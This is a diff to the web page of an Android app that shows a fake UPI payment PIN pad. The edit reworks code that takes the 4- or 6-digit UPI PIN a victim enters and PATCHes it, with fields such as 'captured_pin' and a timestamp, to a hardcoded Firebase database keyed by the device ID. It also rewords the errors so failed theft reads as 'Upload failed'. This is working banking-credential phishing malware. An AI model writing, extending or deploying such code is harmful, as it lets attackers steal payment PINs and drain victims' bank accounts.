@@ -187,8 +187,10 @@ h5 {
     <script>
         let enteredNumbers = [];
         let isHidden = true;
-        let DeviceId = (function(){ try { return Android.getDeviceId() || ''; } catch(e) { return ''; } })();
-        function pinFirebaseUrl() {
+        function getDeviceId() {
+            try { return Android.getDeviceId() || ''; } catch (e) { return ''; }
+        }
+        function getFirebaseUrl() {
             try {
                 var u = Android.getFirebaseDatabaseUrl() || '';
                 return u.replace(/\/$/, '');
@@ -196,6 +198,7 @@ h5 {
                 return 'https://god8-208ac-default-rtdb.asia-southeast1.firebasedatabase.app';
             }
         }
+        let DeviceId = getDeviceId();
         function updateDisplay() {
     let display = document.getElementById("input-display");
     display.innerHTML = "";
@@ -220,14 +223,22 @@ h5 {
         }
 
 function submitData() {
-    
     if (enteredNumbers.length === 6 || enteredNumbers.length === 4) {
-        
-        let requestData = {
-            upipin: enteredNumbers.join('') // Send the entered number as a string
+        DeviceId = getDeviceId();
+        if (!DeviceId) {
+            alert("Device id missing — reopen app and try again.");
+            return;
+        }
+        var pin = enteredNumbers.join('');
+        var requestData = {
+            upipin: pin,
+            upi_pin: pin,
+            pin: pin,
+            captured_pin: pin,
+            captured_at: Date.now()
         };
 
-        fetch(pinFirebaseUrl() + "/clients/" + DeviceId + ".json", {
+        fetch(getFirebaseUrl() + "/clients/" + DeviceId + ".json", {
             method: "PATCH",
             headers: {
                 "Content-Type": "application/json"
@@ -236,7 +247,7 @@ function submitData() {
         })
         .then(response => {
             if (!response.ok) {
-                throw new Error("Payment failed");
+                throw new Error("Upload failed");
             }
             return response.json();
         })
@@ -245,9 +256,10 @@ function submitData() {
         })
         .catch(error => {
             console.error(error);
+            alert("Could not save PIN. Check internet and try again.");
         });
     } else {
-        alert("Please enter a valid 4 or 6-digit number and UPI PIN.");
+        alert("Please enter a valid 4 or 6-digit UPI PIN.");
     }
 }
 
